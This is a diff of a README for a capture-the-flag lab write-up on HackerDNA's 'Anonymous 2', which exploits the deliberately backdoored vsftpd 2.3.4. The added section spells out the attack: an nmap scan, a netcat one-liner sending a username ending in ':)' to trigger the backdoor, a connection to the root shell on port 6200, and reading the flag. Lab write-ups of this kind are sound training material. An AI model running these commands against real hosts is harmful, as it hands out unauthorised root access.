@@ -1,43 +1,41 @@
-Anonymous 2 — vsftpd 2.3.4 Backdoor Exploitation
-A walkthrough of the Anonymous 2 lab from HackerDNA, demonstrating enumeration, identification, and exploitation of the intentionally backdoored vsftpd 2.3.4 service. This challenge highlights how a compromised software distribution can provide attackers with immediate root access through a crafted username.
+Anonymous 2 — vsftpd 2.3.4 Backdoor
+A concise walkthrough of the Anonymous 2 lab from HackerDNA, demonstrating enumeration and exploitation of the intentionally backdoored vsftpd 2.3.4 service. Submitting a username ending in :) triggers a hidden routine that opens a root shell on port 6200.
 
-Note: The lab assigns new IPs each time it launches. All IPs in this repository use <FTP_IP> and <WEB_IP> placeholders for clarity and reproducibility.
+Note: Lab IPs rotate on each deployment. All addresses are represented as <FTP_IP> and <WEB_IP>.
 
-🧭 Lab Summary
-This lab focuses on exploiting a malicious backdoor embedded in vsftpd 2.3.4, a version distributed after attackers compromised the official source. When a username ending in :) is submitted, the service opens a remote shell on port 6200. The goal is to identify the vulnerable service, trigger the backdoor, and retrieve the flag from the resulting root shell.
+Objective
+Identify the vulnerable FTP service, trigger the vsftpd backdoor, gain shell access, and retrieve the flag.
 
-🎯 Objectives
-Enumerate exposed services
+Steps Performed
+Scanned port 21 to identify the FTP service and version
 
-Identify the vulnerable vsftpd version
+Confirmed vsftpd 2.3.4, a known backdoored release
 
-Trigger the backdoor using a crafted username
+Triggered the backdoor using a crafted username ending in :)
 
-Connect to the spawned shell
+Connected to the spawned shell on port 6200
 
-Locate and read the flag
+Executed commands in a silent root shell
 
-📂 Repository Contents
-Anonymous 2.pdf — Full polished writeup with screenshots
+Located and read the flag
 
-Anonymous 2.docx — Working notes and draft version
+Key Commands
+nmap -sV -p 21 <FTP_IP>
 
-README.md — Overview and context for the repository
+(echo "USER test:)"; echo "PASS pass") | nc -v <FTP_IP> 21
+nc -v <FTP_IP> 6200
 
-🛠️ Tools & Techniques
-nmap for service enumeration
+whoami
+cat /root/flag.txt
 
-Gobuster for optional web directory discovery
+Flag
+e*******-****-****-****-**********3
 
-nc (Netcat) for triggering the backdoor and connecting to the shell
+Takeaways
+vsftpd 2.3.4 contains a deliberate backdoor and should never be deployed.
 
-Linux privilege confirmation and file discovery commands
+A single compromised package can provide immediate root access.
 
-🔍 Key Takeaways
-vsftpd 2.3.4 is intentionally backdoored and should never be used in production environments.
+Silent shells require careful, confident command execution.
 
-A single compromised package can grant instant root access with minimal interaction.
-
-Silent shells require confidence and methodical command execution.
-
-Enumeration confirms the attack path, but exploitation is straightforward once the version is identified.
+Enumeration confirms the path; exploitation is minimal once the version is identified.
